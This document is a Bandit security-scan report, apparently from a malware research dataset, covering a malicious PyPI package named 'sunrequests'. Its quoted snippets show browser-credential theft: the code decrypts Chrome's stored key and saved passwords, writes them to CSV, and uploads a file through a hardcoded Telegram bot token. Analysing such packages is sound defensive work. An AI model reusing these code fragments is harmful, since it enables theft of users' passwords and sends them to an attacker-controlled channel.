Run started:2025-05-25 16:19:32.270726

Test results:
>> Issue: [B803:gethostname] socket.gethostname
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:22
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b803_gethostname.html
21	    try:
22	        return socket.gethostbyname(socket.gethostname())
23	    except Exception as e:

--------------------------------------------------
>> Issue: [B302:blacklist] socket.gethostname
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:22
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b302-socket-gethostname
21	    try:
22	        return socket.gethostbyname(socket.gethostname())
23	    except Exception as e:

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:29
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
28	    token = "7651282744:AAF0Yd-OdSENyAu4JeqssC2z_YqMoJlt14o"
29	    url = f"https://api.telegram.org/bot{token}/sendDocument"
30	    

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:32
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
31	    with open(file_path, 'rb') as f:
32	        requests.post(url, data={"chat_id": chat_id}, files={"document": f})
33	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:39
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
38	            with open(local_state_path, "r", encoding='utf-8') as f:
39	                local_state = json.loads(f.read())
40	            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:40
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
39	                local_state = json.loads(f.read())
40	            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
41	            return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:40
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
39	                local_state = json.loads(f.read())
40	            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
41	            return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:66
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
65	        shutil.copy2(db_path, "Loginvault.db")
66	        return sqlite3.connect("Loginvault.db")
67	    except Exception as e:

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:92
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
91	                        csv_writer.writerow([index, url, username, decrypted_password])
92	                cursor.close()
93	                conn.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:93
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
92	                cursor.close()
93	                conn.close()
94	                os.remove("Loginvault.db")

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:114
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
113	            password = login_entry["encryptedPassword"]
114	            decrypted_username = win32crypt.CryptUnprotectData(base64.b64decode(username), None, None, None, 0)[1].decode()
115	            decrypted_password = win32crypt.CryptUnprotectData(base64.b64decode(password), None, None, None, 0)[1].decode()

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:114
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
113	            password = login_entry["encryptedPassword"]
114	            decrypted_username = win32crypt.CryptUnprotectData(base64.b64decode(username), None, None, None, 0)[1].decode()
115	            decrypted_password = win32crypt.CryptUnprotectData(base64.b64decode(password), None, None, None, 0)[1].decode()

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:115
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
114	            decrypted_username = win32crypt.CryptUnprotectData(base64.b64decode(username), None, None, None, 0)[1].decode()
115	            decrypted_password = win32crypt.CryptUnprotectData(base64.b64decode(password), None, None, None, 0)[1].decode()
116	            csv_writer.writerow([index, url, decrypted_username, decrypted_password])

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/hello_world/main.py:115
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
114	            decrypted_username = win32crypt.CryptUnprotectData(base64.b64decode(username), None, None, None, 0)[1].decode()
115	            decrypted_password = win32crypt.CryptUnprotectData(base64.b64decode(password), None, None, None, 0)[1].decode()
116	            csv_writer.writerow([index, url, decrypted_username, decrypted_password])

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/sunrequests-0.0.1/sunrequests-0.0.1/sunrequests-0.0.1/setup.py:28
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
27		# The URL that represents the homepage of the project. Most projects link to the repo.
28		url="https://github.com/gokm5133/sample-pypi-package",
29		# Finds all packages within in the project and combines them into the distribution together.
30		packages=setuptools.find_packages(),

--------------------------------------------------

Code scanned:
	Total lines of code: 130
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 6.0
		High: 9.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 11.0
		High: 4.0
Files skipped (0):
